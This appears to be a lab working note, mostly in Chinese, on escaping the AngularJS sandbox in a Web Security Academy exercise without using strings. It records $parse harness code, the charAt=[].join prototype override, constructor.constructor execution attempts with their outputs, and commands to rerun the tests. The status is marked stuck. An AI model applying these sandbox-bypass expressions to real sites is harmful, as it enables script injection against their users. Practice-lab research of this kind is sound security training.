---
title: lab-angular-sandbox-escape-without-strings
---

# lab-angular-sandbox-escape-without-strings

> evidences: [[client-side-template-injection-family]]

- 题面:逃逸 AngularJS 沙箱执行 `alert`,不可用 `$eval`、不可用字符串。
- 实例(批48):https://0aaa00fc03b8daa880250336000a0035.web-security-academy.net
- 状态:**stuck**(墙从"沙箱检查"移到了"override 之后 getter 本身是坏的")

## 机制(生成代码)

`var key='<参数名>'; $scope.query[key]='<值>'; $scope.value = $parse(key)($scope.query);` —— 参数名 = 表达式,scope = `$scope.query`。

## 新证据(`page_eval_batch` 页内批量分桶)

harness:`--prelude 'try{window.P=angular.element(document.body).injector().get("$parse")}catch(e){P=null} window.S={a:"alert(1)",b:"pw12345678"}; window.alert=<hook>'`,候选写成纯 JS 表达式 `P('EXPR')(S)`。

1. **可用的 override 形式**:`P('a.constructor.prototype.charAt=[].join')(S)` → 值:function;随后 `String(String.prototype.charAt)` → `function join() { [native code] }` ✓。
   注意 `toString.constructor.prototype.charAt=[].join` 会 **Uncaught**(`Object.prototype.toString.constructor` = Function → 被拦);必须用**字符串型 scope 属性**取到 String。
2. **override 之后新编译的 getter 是坏的(量化)**:
   - `P('1+1')(S)` → 桶 value:number 但值为 **NaN**(JSON 里序列化成 null)⇒ **连算术都被破坏**;
   - `P('a')(S)` → `"alert(1)"`(标识符读取仍正常);
   - `P('constructor.constructor(a)()')(S)` → **undefined,无异常、无执行**(静默 no-op);同一表达式在**未** override 时是 Uncaught。
3. **原语在裸 JS 里可用**(排除"Function 被 CSP 禁"的解释):
   `Function('window.__fired=99')()` → 99;`S.constructor.constructor('window.__fired=98')()` → 98;而任何经 `$parse` 的等价式都不执行。

⇒ 结论:override 确实废掉了 isIdent 重写与 isecobj 抛错,但**产出的取数函数同时被 charAt 污染成错的**(算术 NaN / 调用静默丢失),所以"先 override 再跑执行式"这条路不是被检查拦住,而是被**编译器自身**拦住。

## 未决面

- 要找的是"**其生成 getter 不经过被污染的 charAt 路径**"的表达式,或一条**无需 override** 就能过 ensureSafe 的执行式(scope 值可当无引号字符串源,参数名里 `[ ] | ;` 放行)。
- 下一步:把候选式扩到 `P('EXPR')(S)` 的更大枚举(算术/成员/调用/字面量四类对照),用 `1+1` 是否 NaN 当"该次 parse 是否被污染"的**探针**,二分出哪些语法节点安全。

## 复现命令

```
range_launch launch D82E3A0C…C05390F1 --jar ~/.pi-rs/agent/chrome-jar.json
page_eval_batch "https://<inst>/?search=1" --file /tmp/cands.txt --ws ws://127.0.0.1:9333 \
  --prelude 'try{window.P=angular.element(document.body).injector().get("$parse")}catch(e){P=null} window.__fired=0;window.alert=function(){window.__fired++};window.S={a:"alert(1)"};'
```

## 关系

- 族:[[client-side-template-injection-family]];沙箱表见 [[angularjs-1-4-4-sandbox-escape-practice-notes]]。
